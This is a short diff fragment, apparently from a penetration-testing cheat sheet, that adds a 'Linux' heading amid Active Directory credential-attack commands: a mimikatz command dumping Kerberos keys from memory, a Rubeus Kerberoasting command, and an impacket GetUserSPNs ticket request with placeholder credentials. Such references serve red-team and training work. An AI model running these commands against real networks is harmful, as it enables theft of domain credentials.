@@ -31,6 +31,7 @@ mimikatz.exe sekurlsa::ekeys
 ```bash
 Rubeus.exe kerberoast /format:hashcat /simple
 ```
+## Linux
 (GetUserSPNs) Kerberoasting
 ```bash
 impacket-GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC IP> -request 
